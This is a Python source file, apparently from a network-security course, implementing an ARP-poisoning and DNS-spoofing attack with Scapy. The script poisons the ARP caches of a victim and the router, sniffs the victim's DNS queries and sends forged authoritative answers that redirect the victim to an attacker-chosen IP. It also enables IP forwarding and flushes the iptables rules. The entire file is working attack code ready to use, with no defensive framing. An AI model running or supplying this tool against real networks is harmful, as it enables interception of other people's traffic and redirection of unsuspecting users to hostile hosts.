#python spoof.py -v 192.168.0.7 -r 192.168.0.100 -d 192.168.0.6 -i 192.168.0.8

'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
--  SOURCE FILE:    spoof.py
--
--  PROGRAM:        ARP Posisoning a victim machine, responding with spoofed DNS responses.
--
--  FUNCTIONS:      getOurMac(), getMAC(), poison(), respond(), parse(), sniffDNS(),
					reset(), main()
--
--  DATE: November 14, 2016
--
--  REVISIONS: November 14, 2016
--
--  DESIGNERS: Kyle Gilles & Clemens Lo
--
--  NOTES:
--  Our Attacking machine initiates ARP Poisoning on the victim machine. 
--	We will sniff for their DNS requests, then create a spoofed packet that will 
--  redirect them to our target DNS responder.
'''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''
#!/usr/bin/env python

from scapy.all import *
from multiprocessing import Process
from subprocess import Popen, PIPE
import argparse, threading, time, re

#parse command line arguments
parser = argparse.ArgumentParser(description='ARP Poisoning and DNS Spoofing')
parser.add_argument('-v', '--victim', dest='victimIP', help="IP Address of the victim", required=True)
parser.add_argument('-i', '--ip', dest='localIP', help="Our IP Address", required=True)
parser.add_argument('-r', '--router', dest='routerIP', help="IP Address of the Router", required=True)
parser.add_argument('-t', '--target', dest='targetIP', help="IP Address of our DNS Responder", required=True)

args = parser.parse_args()
victimIP = args.victimIP
localIP = args.localIP
routerIP = args.routerIP
targetIP = args.targetIP
localMAC = ""
victimMAC = ""
routerMAC = ""


#returns MAC address of specific interface
def getOurMAC(interface):
    try:
        mac = open('/sys/class/net/'+interface+'/address').readline()
    except:
        mac = "00:00:00:00:00:00"
   
    return mac[0:17]





#returns MAC address of supplied IP address
def getMAC(IP):

    #ping to add the target to our system's ARP cache
    pingResult = Popen(["ping", "-c 1", IP], stdout=PIPE)
    pid = Popen(["arp", "-n", IP], stdout=PIPE)
    s = pid.communicate()[0]
    #return in MM:MM:MM:SS:SS:SS format
    MAC = re.search(r"(([a-f\d]{1,2}\:){5}[a-f\d]{1,2})", s).groups()[0]

    return MAC


#constructs and sends arp packets to send to router and to victim. 
def poison(localMAC, victimMAC, routerMAC):
	#construct packets
    arpPacketVictim = Ether(src=localMAC, dst=victimMAC)/ARP(hwsrc=localMAC, hwdst=victimMAC, psrc=routerIP, pdst=victimIP, op=2)
    arpPacketRouter = Ether(src=localMAC, dst=routerMAC)/ARP(hwsrc=localMAC, hwdst=routerMAC, psrc=victimIP, pdst=routerIP, op=2)

    print "Active ARP Poison to: " + str(victimIP)

    while 1:
        try:
            sendp(arpPacketVictim, verbose=0)
            sendp(arpPacketRouter, verbose=0)
            #pause between each send
            time.sleep(3)
        except KeyboardInterrupt:
            sys.exit(0)




#construc and send a spoofed DNS response packet to the victim
def respond(packet):
    global targetIP
    responsePacket = (IP(dst=victimIP, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)/\
                    DNS(id=packet[DNS].id, qd=packet[DNS].qd, aa=1, qr=1, an=DNSRR(rrname=packet[DNS].qd.qname, ttl=10, rdata=targetIP)))
    send(responsePacket, verbose=0)
    print "Forwarded Spoofed DNS Packet\nReuested: " + str(packet[DNS].qd.qname)
    print "Received: "+ str(targetIP)
    return




#this parse creates a thread
def parse(packet):
    #qr==0 is a dns request
	if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
		respondThread = threading.Thread(target=respond, args=packet)
		respondThread.start()




#this parse creates a process
#def parse (packet):
#	if packet.haslayer(DNS) and packet.getlayer(DNS).qr==0:
#		responseProcess = Process(target=respond, args=packet)
#	    responseProcess.start()
#		esponseProcess.join()




#initiate sniff filter for DNS requests
def sniffDNS():
    global victimIP
    print "Sniffing for DNS Requests"
    sniffFilter = "udp and port 53 and src " +str(victimIP)
    sniff(filter=sniffFilter, prn=parse)




#invoked on user exit. Flush iptables rules
def reset():
    Popen(["iptables -F"], shell=True, stdout=PIPE)




#invoked on start. Setup prerequesites.
def setup():
    #check for root user
    if os.geteuid() != 0:
        sys.exit("[!] Please run as root")

    #setup forwarding rules
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    #disable forwarding of DNS requests to router
    #uncomment line below to invoke iptables rule
    #Popen(["iptables -A FORWARD -p UDP --dport 53 -j DROP"], shell=True, stdout=PIPE)





def main():
    setup()

    victimMAC = getMAC(victimIP)
    localMAC = getOurMAC("eno1")
    routerMAC = getMAC(routerIP)

    #seperate threads for ARP poisoning and DNS spoofing
    poisonThread = threading.Thread(target=poison, args=(localMAC, victimMAC, routerMAC))
    spoofThread = threading.Thread(target=sniffDNS)

    #make threads daemons, so that when the main thread receives KeyboardInterrupt the whole process terminates
    poisonThread.daemon = True
    spoofThread.daemon = True

    poisonThread.start()
    spoofThread.start()



    #CTRL C invokes reset method to handle iptables flush
    while True:
        try:
            time.sleep(5)
        except KeyboardInterrupt:
            reset()
            print "Terminating"
            sys.exit(0)


if __name__ == '__main__':
    main()
